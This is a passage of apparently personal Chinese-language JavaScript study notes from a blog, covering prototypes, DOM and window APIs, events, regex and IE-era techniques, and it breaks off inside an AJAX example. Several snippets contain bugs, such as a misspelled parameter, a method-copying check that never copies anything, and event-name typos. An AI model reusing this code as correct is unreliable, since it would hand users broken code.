function_">people</span>(<span class="params">name, age, sex</span>) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    people.prototype.info = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        printf(<span class="string">&quot;My name is &quot;</span> + this.name + <span class="string">&quot;, I&#x27;m &quot;</span> + this.age + <span class="string">&quot; years old.&quot;</span> + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> humen = <span class="keyword">new</span> people(<span class="string">&quot;Lijing&quot;</span>, <span class="number">19</span>, <span class="string">&quot;man&quot;</span>);</span><br><span class="line">    humen.info();</span><br><span class="line"></span><br><span class="line">★★★★★★★★IE4 &amp;&amp; IE5 没有apply函数，利用prototype来构造这样的原型函数★★★★★★★★</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">Function</span>.prototype.apply) &#123;</span><br><span class="line">        <span class="keyword">Function</span>.prototype.apply = <span class="keyword">function</span> (<span class="params">object, parameters</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> f = this;</span><br><span class="line">            <span class="keyword">var</span> o = object || window;</span><br><span class="line">            <span class="keyword">var</span> args = patameters || [];</span><br><span class="line"></span><br><span class="line">            o._$_apply_$_ = f;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> stringArgs = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; args.<span class="built_in">length</span>; i++) &#123;</span><br><span class="line">                stringArgs[i] = <span class="string">&quot;args[&quot;</span> + i + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> arglist = stringArgs.join(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> methodcall = <span class="string">&quot;o._$_apply_$_(&quot;</span> + arglist + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = eval(methodcall);</span><br><span class="line"></span><br><span class="line">            delete o._$_apply_$_;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> ★★★★★★★★类属性,类方法,类私有成员,子类与超类★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Rectangle</span>(<span class="params">width, height</span>) &#123;</span><br><span class="line">        this.width = width;</span><br><span class="line">        this.height = height;</span><br><span class="line">    &#125;</span><br><span class="line">    Rectangle.prototype.<span class="built_in">area</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> this.width * this.height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PositionRectangle</span>(<span class="params">x, y, w, h</span>) &#123;</span><br><span class="line">        Rectangle.call(this, w, h);</span><br><span class="line">        this.x = x;</span><br><span class="line">        this.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PositionRectangle.prototype = <span class="keyword">new</span> Rectangle();</span><br><span class="line">    delete PositionRectangle.prototype.width;</span><br><span class="line">    delete PositionRectangle.prototype.height;</span><br><span class="line">    PositionRectangle.prototype.constructor = PositionRectangle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> r = <span class="keyword">new</span> PositionRectangle(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    printf(r.<span class="built_in">area</span>());</span><br><span class="line">    printf(r instanceof PositionRectangle &amp;&amp; r instanceof Rectangle &amp;&amp; r instanceof Object);</span><br><span class="line"></span><br><span class="line">    注：可以使用call和apply来调用被覆盖的函数</span><br><span class="line">    such as: Circle.prototype.toString.apply(this);</span><br><span class="line"></span><br><span class="line">★★★★★★★★非继承的扩展★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">borrowMethods</span>(<span class="params">borrowFrom, addTo</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> from = borrowFrom.prototype;</span><br><span class="line">        <span class="keyword">var</span> to = addTo.prototype;</span><br><span class="line">        <span class="keyword">for</span> (m in from) &#123;</span><br><span class="line">            <span class="keyword">if</span> (from[m] != <span class="string">&quot;function&quot;</span>) continue;</span><br><span class="line">            to[m] = from[m];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★确定对象类型★★★★★★★★</span><br><span class="line"></span><br><span class="line">    △ <span class="built_in">typeof</span> <span class="literal">null</span> → <span class="string">&quot;object&quot;</span>;</span><br><span class="line">       <span class="built_in">typeof</span> <span class="literal">undefined</span> → <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line">       <span class="built_in">typeof</span> 数组 → <span class="string">&quot;object&quot;</span>;</span><br><span class="line">       <span class="built_in">typeof</span> 函数 → <span class="string">&quot;function&quot;</span></span><br><span class="line"></span><br><span class="line">    △ instanceof 和构造函数 constructor</span><br><span class="line">      【特点：他们只能允许根据已经知道的类来进行测试对象，无法用于检查未知的对象】</span><br><span class="line"></span><br><span class="line">    △ 用Object.toString()测试对象的类型</span><br><span class="line"></span><br><span class="line">    △ 鸭子类型识别（Duck Typing）</span><br><span class="line"></span><br><span class="line">★★★★★★★★渐变效果★★★★★★★★</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setOpacity</span>(<span class="params">obj, val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (document.documentElement.filters)&#123;</span><br><span class="line">            obj.style.<span class="built_in">filter</span> = <span class="string">&quot;alpha(opacity=&quot;</span> + val + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            obj.style.opacity = val / <span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fadeIn</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> val = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">var</span> t = setInterval(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (val &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">                    clearInterval(t);</span><br><span class="line">                &#125;</span><br><span class="line">                setOpacity(obj, val);</span><br><span class="line">                val += <span class="number">10</span>;</span><br><span class="line">            &#125;, <span class="number">250</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        ★★  fadeIn($(<span class="string">&quot;changeBox&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWidth</span>(<span class="params">obj, val</span>) &#123;</span><br><span class="line">        obj.style.width = parseInt(val) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setHeight</span>(<span class="params">obj, val</span>) &#123;</span><br><span class="line">        obj.style.height = parseInt(val) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">slide</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> t = setInterval(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (val &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">                    clearInterval(t);</span><br><span class="line">                &#125;</span><br><span class="line">                setWidth(obj, val);</span><br><span class="line">                setHeight(obj, val);</span><br><span class="line">                val += <span class="number">10</span>;</span><br><span class="line">            &#125;, <span class="number">80</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        ★★  slide($(<span class="string">&quot;changeBox&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setTop</span>(<span class="params">obj, val</span>) &#123;</span><br><span class="line">        obj.style.<span class="built_in">top</span> = parseInt(val) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setLeft</span>(<span class="params">obj, val</span>) &#123;</span><br><span class="line">        obj.style.<span class="built_in">left</span> = parseInt(val) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> t = setInterval(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (val &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">                    clearInterval(t);</span><br><span class="line">                &#125;</span><br><span class="line">                setTop(obj, val);</span><br><span class="line">                setLeft(obj, val);</span><br><span class="line">                val += <span class="number">10</span>;</span><br><span class="line">            &#125;, <span class="number">80</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        ★★  move($(<span class="string">&quot;changeBox&quot;</span>));</span><br><span class="line"></span><br><span class="line">★★★★★★★★正则表达式★★★★★★★★</span><br><span class="line">    正则表达式中的特殊符号有  ^    $    .    *    +    ?    =    !    |    \    /    ()    []    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    *|------------------------------------------------------------</span><br><span class="line">    *  |    [...]        括号内任意字符</span><br><span class="line">    *  |    [^...]        非上</span><br><span class="line">    *  |    .            除换行符和其他Unicode行终止符之外的任意字符</span><br><span class="line">    *  |    \w            任何ASCII单字字符</span><br><span class="line">    *  |    \W            非上</span><br><span class="line">    *  |    \s            任何Unicode空白</span><br><span class="line">    *  |    \S            非上</span><br><span class="line">    *  |    \d            任何ASCII数字，等价于[<span class="number">0</span><span class="number">-9</span>]</span><br><span class="line">    *  |    \D            非上</span><br><span class="line">    *  |    \b            匹配一个词语的边界</span><br><span class="line">    *  |    \B            非上</span><br><span class="line">    *  |    &#123;n, m&#125;        匹配至少 n 至多 m 次</span><br><span class="line">    *  |    &#123;n,&#125;        匹配至少 n 次</span><br><span class="line">    *  |    &#123;n&#125;            匹配恰好 n 次</span><br><span class="line">    *  |    ?            匹配前一项<span class="number">0</span>或<span class="number">1</span>次</span><br><span class="line">    *  |    +            匹配前一项<span class="number">1</span>次或多次</span><br><span class="line">    *  |    *            匹配前一项<span class="number">0</span>次或多次</span><br><span class="line">    *  |    ^            匹配字符串开头</span><br><span class="line">    *  |    $            匹配字符串结尾</span><br><span class="line">    *  |    i            忽略大小写</span><br><span class="line">    *  |    g            全局匹配</span><br><span class="line">    *  |    m            多行匹配</span><br><span class="line">    *  |-------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">text</span> = <span class="string">&quot;JavaScript is not Java, thanks god, that is true! Java is not Javascript!!&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&quot;http:www.baidu.com/pic.html&quot;</span></span><br><span class="line">    <span class="keyword">var</span> Reg = <span class="regexp">/java/gi</span>;</span><br><span class="line">    <span class="keyword">var</span> RegUrl = <span class="regexp">/(\w+):\/\/([\w.]+)\/(\S*)/</span>;</span><br><span class="line">    <span class="keyword">var</span> res = url.match(RegUrl);</span><br><span class="line">    <span class="keyword">var</span> res = <span class="built_in">text</span>.<span class="built_in">replace</span>(<span class="regexp">/Java/gi</span>, <span class="string">&quot;JAVA&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> res = Reg.exec(<span class="built_in">text</span>);</span><br><span class="line">    <span class="keyword">var</span> res = Reg.test(<span class="built_in">text</span>);</span><br><span class="line">    printf(<span class="built_in">text</span>);</span><br><span class="line">    printf(res);</span><br><span class="line"></span><br><span class="line">★★★★★★★★drag拖动★★★★★★★★</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> box = document.getElementById(<span class="string">&quot;box&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> drag = &#123;</span><br><span class="line">        <span class="attr">start</span>: <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = window.event || evt;</span><br><span class="line">            box.startX = e.clientX - box.offsetLeft;</span><br><span class="line">            box.startY = e.clientY - box.offsetTop;</span><br><span class="line">            document.onmousemove = drag.ondrag;</span><br><span class="line">            document.addEventListener ? document.addEventListener(<span class="string">&quot;mouseup&quot;</span>,drag.stop,<span class="literal">false</span>) : document.attachEvent(<span class="string">&quot;onmouseup&quot;</span>,drag.stop);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">ondrag</span>: <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = window.event || evt;</span><br><span class="line">            with(box.style) &#123;</span><br><span class="line">                position = <span class="string">&quot;absolute&quot;</span>;</span><br><span class="line">                <span class="built_in">left</span> = e.clientX - box.startX + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                <span class="built_in">top</span> = e.clientY - box.startY + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">stop</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            document.onmousemove = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            document.detachEvent ?  document.detachEvent(<span class="string">&quot;onmouseup&quot;</span>,drag.start) : document.removeEventListener(<span class="string">&quot;mouseup&quot;</span>,drag.start,<span class="literal">false</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            box.addEventListener ? box.addEventListener(<span class="string">&quot;mousedown&quot;</span>,drag.start,<span class="literal">false</span>) : box.attachEvent(<span class="string">&quot;onmousedown&quot;</span>,drag.start);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    drag.init();</span><br><span class="line"></span><br><span class="line">★★★★★★★★浏览器Location和History★★★★★★★★</span><br><span class="line">Location: protocol + host + pathname + search</span><br><span class="line">printf(document.location == document.URL); <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">在大多数情况下，document.location和location.href是相同的，但是，当存在服务器重定向时，</span><br><span class="line">document.location包含的是装载的URL，而location.href包含的则是原始请求的文档的URL</span><br><span class="line"></span><br><span class="line">    |-------self, window</span><br><span class="line">    |</span><br><span class="line">    |-------navigator</span><br><span class="line">    |</span><br><span class="line">    |-------frames[]        |------forms[]--------elments[]------options[]</span><br><span class="line">    |                       |</span><br><span class="line">    |-------location        |------anchors[]</span><br><span class="line">    |                       |</span><br><span class="line">    |-------document--------|------links[]</span><br><span class="line">    |                       |</span><br><span class="line">    |-------history         |------images[]</span><br><span class="line">    |                       |</span><br><span class="line">    |-------screen          |------applets[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(m in navigator)&#123;printf(m + <span class="string">&quot;:&quot;</span> + screen[m]);&#125;</span><br><span class="line"></span><br><span class="line">    printf(window.screenX);</span><br><span class="line">    printf(window.screenY);</span><br><span class="line">    printf(window.outerWidth);</span><br><span class="line">    printf(window.outerHeight);</span><br><span class="line">    printf(window.innerWidth);</span><br><span class="line">    printf(window.innerHeight);</span><br><span class="line">    以上属性IE7下没有</span><br><span class="line">    printf(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    printf(screen.width);</span><br><span class="line">    printf(screen.height);</span><br><span class="line">    printf(screen.availWidth);</span><br><span class="line">    printf(screen.availHeight);</span><br><span class="line"></span><br><span class="line">    子窗口和父窗口的相互控制</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">openWin</span>(<span class="params"></span>) &#123;</span><br><span class="line">        childWin = window.open(<span class="string">&quot;javascript:&#x27;&lt;h1&gt;hello&lt;/h1&gt;&#x27;&quot;</span>, <span class="string">&quot;newWin&quot;</span>, <span class="string">&quot;height=0,width=0&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> t = setInterval(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (val &gt; <span class="number">400</span>)&#123;</span><br><span class="line">                clearInterval(t);</span><br><span class="line">            &#125;</span><br><span class="line">            childWin.resizeTo(val,val);</span><br><span class="line">            childWin.moveTo(val,val);</span><br><span class="line">            val += <span class="number">10</span>;</span><br><span class="line">        &#125;,<span class="number">100</span>);</span><br><span class="line">        childWin.opener.focus();</span><br><span class="line">        childWin.opener.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">closeWin</span>(<span class="params"></span>) &#123;</span><br><span class="line">        childWin.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.onclick = openWin;</span><br><span class="line">    document.onkeydown = closeWin;</span><br><span class="line"></span><br><span class="line">★★★★★★★★ERROR提示★★★★★★★★</span><br><span class="line"></span><br><span class="line">    window.onerror = <span class="keyword">function</span> (<span class="params">msg, url, line</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Wow..my gosh!!! You got an error.\n\n&quot;</span> + <span class="string">&quot;【Error】: &quot;</span> + msg + <span class="string">&quot;\n【url】: &quot;</span> + url + <span class="string">&quot;\n【line】: &quot;</span> + line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★document★★★★★★★★</span><br><span class="line"></span><br><span class="line">    帧结构演示</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;frameset cols=<span class="string">&quot;200,*&quot;</span>&gt;</span><br><span class="line">      &lt;frame src=<span class="string">&quot;./gustbook.html&quot;</span>&gt;</span><br><span class="line">      &lt;frame src=<span class="string">&quot;/gustbook.html&quot;</span> name=<span class="string">&quot;view_frame&quot;</span>&gt;</span><br><span class="line">    &lt;/frameset&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params"></span>) &#123;</span><br><span class="line">        printf(<span class="string">&quot;something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(w,<span class="number">1000</span>); 覆盖原来的文本</span><br><span class="line">    注：一个文档绝不应该从时间句柄中调用他自己的write()方法</span><br><span class="line"></span><br><span class="line">    ★document.open</span><br><span class="line">    功能：打开一个新文档，并擦除当前文档的内容。</span><br><span class="line">    语法：document.open(mimetype,<span class="built_in">replace</span>)</span><br><span class="line">    参数：</span><br><span class="line"></span><br><span class="line">    mimetype：可选。规定正在写的文档的类型。默认值是<span class="string">&quot;text/html&quot;</span>。</span><br><span class="line">    <span class="built_in">replace</span>：可选。当此参数设置后，可引起新文档从父文档继承历史条目。</span><br><span class="line">    注<span class="number">1</span>：open()方法将擦除当前HTML文档的内容，开始一个新的文档，新文档用write()方法或writeln()方法编写。</span><br><span class="line">    注<span class="number">2</span>：调用open()方法打开一个新文档并且用write()方法设置文档内容后，必须记住用close()方法关闭文档，并迫使其内容显示出来。</span><br><span class="line"></span><br><span class="line">    注<span class="number">3</span>：属于被覆盖的文档的一部分的脚本或事件句柄不能调用该方法，因为脚本或事件句柄自身也会被覆盖。</span><br><span class="line"></span><br><span class="line">    ★document.close</span><br><span class="line">    功能：close()方法可关闭一个由open()方法打开的输出流，并显示选定的数据。</span><br><span class="line">    语法：document.close()</span><br><span class="line">    参数：无。</span><br><span class="line"></span><br><span class="line">    注：该方法将关闭open()方法打开的文档流，并强制地显示出所有缓存的输出内容。如果您使用write()方法动态地输出一个文档，必须记住当你这么做的时候要调用close()方法，以确保所有文档内容都能显示。</span><br><span class="line"></span><br><span class="line">    ★一旦调用了close()，就不应该再次调用write()，因为这会隐式地调用open()来擦除当前文档并开始一个新的文档。</span><br><span class="line"></span><br><span class="line">★★★★★★★★节点类型★★★★★★★★</span><br><span class="line"></span><br><span class="line">    |--------------------------------|</span><br><span class="line">    |      接口            nodeType值 |</span><br><span class="line">    |--------------------------------|</span><br><span class="line">    |    Element                <span class="number">1</span>    |</span><br><span class="line">    |    <span class="built_in">Text</span>                <span class="number">3</span>       |</span><br><span class="line">    |    Document            <span class="number">9</span>       |</span><br><span class="line">    |    Comment                <span class="number">8</span>    |</span><br><span class="line">    |    DocumentFragment    <span class="number">11</span>      |</span><br><span class="line">    |    Attr                <span class="number">2</span>       |</span><br><span class="line">    |--------------------------------|</span><br><span class="line"></span><br><span class="line">★★★★★★★★document.documentElement★★★★★★★★</span><br><span class="line"> 引用的是 html</span><br><span class="line">appendChild(), insetBefore(), replaceChild()</span><br><span class="line">可以用document.createDocumentFragment()来创建一个DocumentFragment</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reverse</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = document.createDocumentFragment();</span><br><span class="line">        <span class="keyword">while</span> (n.lastChild) f.appendChild(n.lastChild);</span><br><span class="line">        n.appendChild(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★查询选定的文本★★★★★★★★</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getSelectedText</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.getSelection) &#123;</span><br><span class="line">            <span class="keyword">return</span> window.getSelection().toString();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (document.getSelection) &#123;</span><br><span class="line">            <span class="keyword">return</span> document.getSelection();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> document.selection.createRange().<span class="built_in">text</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">text</span> = getSelectedText();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">text</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;changeBox&quot;</span>).innerHTML = <span class="built_in">text</span>;</span><br><span class="line">            window.open(<span class="string">&quot;http:www.baidu.com/s?wd=&quot;</span> + encodeURIComponent(<span class="built_in">text</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!document.<span class="built_in">all</span>) &#123;</span><br><span class="line">        window.onmouseup = start;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        document.attachEvent(<span class="string">&quot;onmouseup&quot;</span>, start);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> o = $(<span class="string">&quot;changeBox&quot;</span>);</span><br><span class="line">    printf(o.offsetTop);</span><br><span class="line">    printf(o.offsetLeft);</span><br><span class="line">    printf(o.clientWidth);</span><br><span class="line">    printf(o.clientHeight);</span><br><span class="line">    printf(o.scrollTop);</span><br><span class="line">    printf(o.scrollLeft);</span><br><span class="line">    printf(o.offsetWidth);</span><br><span class="line">    printf(o.offsetHeight);</span><br><span class="line"></span><br><span class="line">★★★★★★★★Key Event and Mouse Event★★★★★★★★</span><br><span class="line">    屏蔽右键菜单,可以应用到任何一个区域</span><br><span class="line">    oncontextmenu=<span class="string">&quot;window.event.returnValue=false&quot;</span></span><br><span class="line">    document.onmousedown = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = window.event || e;</span><br><span class="line">        <span class="keyword">if</span> (e.button == <span class="number">0</span>) &#123;</span><br><span class="line">            document.body.style.background = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (e.button == <span class="number">1</span>) &#123;</span><br><span class="line">            document.body.style.background = <span class="string">&quot;blue&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            document.body.style.background = <span class="string">&quot;yellow&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.onkeydown = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = window.event || e;</span><br><span class="line">        <span class="keyword">if</span> (e.shiftKey) &#123;</span><br><span class="line">            alert(<span class="string">&quot;shift&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">if</span> (e.ctrlKey) &#123;</span><br><span class="line">            alert(<span class="string">&quot;ctrl&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (e.altKey) &#123;</span><br><span class="line">            alert(<span class="string">&quot;alt&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            alert(<span class="string">&quot;others&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★合成事件★★★★★★★★</span><br><span class="line">    Document.createEvent()创建, Event.initEvent(), UIEvent.initEvent(), MouseEvent.initEvent.initMouseEvent()初始化</span><br><span class="line">    dipatchEvent方法来分派事件</span><br><span class="line">    IE中，使用Document.createEventObjec来创建一个新的事件对象。然后使用目标元素的fireEvent()方法来分派他</span><br><span class="line">    <span class="keyword">var</span> DataEvent = &#123;&#125;;</span><br><span class="line">    DataEvent.send = <span class="keyword">function</span> (<span class="params">target, datatype, data</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">typeof</span> target == <span class="string">&quot;string&quot;</span>) target = $(target);</span><br><span class="line">        <span class="keyword">if</span> (document.createEvent) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = createEvent(<span class="string">&quot;Events&quot;</span>);</span><br><span class="line">            e.initEvent(<span class="string">&quot;dataavailable&quot;</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (document.createEventObject) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = document.createEventObject();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">return</span>;</span><br><span class="line">        e.datatype = datatype;</span><br><span class="line">        e.data = data;</span><br><span class="line">        <span class="keyword">if</span> (target.dispatchEvent) target.dispatchEvent(e);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target.fireEvent) target.fireEvent(<span class="string">&quot;ondataavailable&quot;</span>, e);</span><br><span class="line">    &#125;;</span><br><span class="line">    DataEvent.receive = <span class="keyword">function</span> (<span class="params">target, handler</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">typeof</span> target == <span class="string">&quot;string&quot;</span>) target = $(target);</span><br><span class="line">        <span class="keyword">if</span> (target.addEventListener) target.addEventListener(<span class="string">&quot;dataavailable&quot;</span>, handler, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target.attachEvent) target.attachEvent(<span class="string">&quot;ondataavaliable&quot;</span>, handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★IE支持客户端永久性★★★★★★★★</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> username = <span class="string">&quot;hustskyking&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> password = <span class="string">&quot;psw&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> memory = $(<span class="string">&quot;changeBox&quot;</span>);</span><br><span class="line">    memory.style.behavior = <span class="string">&quot;url(&#x27;#default#userData&#x27;)&quot;</span>;</span><br><span class="line">    memory.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">    memory.setAttribute(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">    memory.save(<span class="string">&#x27;myPersistentData&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">now</span> = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime();</span><br><span class="line">    <span class="keyword">var</span> expires = <span class="built_in">now</span> + <span class="number">10</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>;</span><br><span class="line">    memory.expires = (<span class="keyword">new</span> <span class="built_in">Date</span>(expires)).toUTCString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> memory = $(<span class="string">&quot;changeBox&quot;</span>);</span><br><span class="line">    memory.load(<span class="string">&quot;myPersistentData&quot;</span>);</span><br><span class="line">    alert(memory.getAttribute(<span class="string">&quot;username&quot;</span>));</span><br><span class="line"></span><br><span class="line">★★★★★★★★AJAX★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = window.XMLHttpRequest ? <span class="keyword">new</span> XMLHttpRequest() : <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">        xmlhttp.</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="keyword">function</span> (<span class="params"></span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span> &amp;&amp; xmlhttp.status == <span class="number">200</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                $(<span class="string">&quot;changeBox&quot;</span>).innerHTML = xmlhttp.responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        xmlhttp.open(<span 